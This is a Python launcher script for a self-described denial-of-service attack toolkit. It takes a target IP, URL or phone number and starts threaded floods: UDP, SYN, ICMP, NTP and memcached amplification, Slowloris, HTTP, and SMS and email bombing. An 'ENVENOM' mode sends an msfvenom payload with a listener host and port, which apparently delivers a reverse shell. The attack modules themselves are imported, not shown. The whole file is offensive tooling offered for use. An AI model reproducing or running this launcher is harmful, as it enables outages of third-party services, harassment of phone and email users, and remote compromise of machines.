#!/usr/bin/python3
import os
import sys
import argparse
import threading

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
    from tools.L4.envenom import main as envenom_main
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

parser = argparse.ArgumentParser(description="Denial-of-Service Attack ToolKit")
parser.add_argument("--target", type=str, metavar="<IP:PORT, URL, PHONE>", help="Target IP:port, url or phone")
parser.add_argument("--method", type=str, metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP/ENVENOM>", help="Attack method")
parser.add_argument("--time", type=int, default=10, metavar="<time>", help="time in seconds")
parser.add_argument("--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)")

# Add envenom-specific argument parser
envenom_parser = parser.add_argument_group("Envenom Options")
envenom_parser.add_argument("--payload", type=str, required=True, help='Payload for msfvenom')
envenom_parser.add_argument("--lhost", type=str, required=True, help='Local host for msfvenom payload')
envenom_parser.add_argument("--lport", type=int, required=True, help='Local port for msfvenom payload')
envenom_parser.add_argument("--num_packets", type=int, default=100, help='Number of packets to send')
envenom_parser.add_argument("--burst_interval", type=float, default=0.1, help='Interval between packets in seconds')

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if not method or not target or not time:
    parser.print_help()
    sys.exit(1)

if method == "ENVENOM":
    def envenom_attack():
        envenom_main(target, args.payload, args.lhost, args.lport, time, args.num_packets, args.burst_interval)

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=envenom_attack)
        t.daemon = True
        threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()
else:
    with AttackMethod(duration=time, name=method, threads=threads, target=target) as Flood:
        Flood.Start()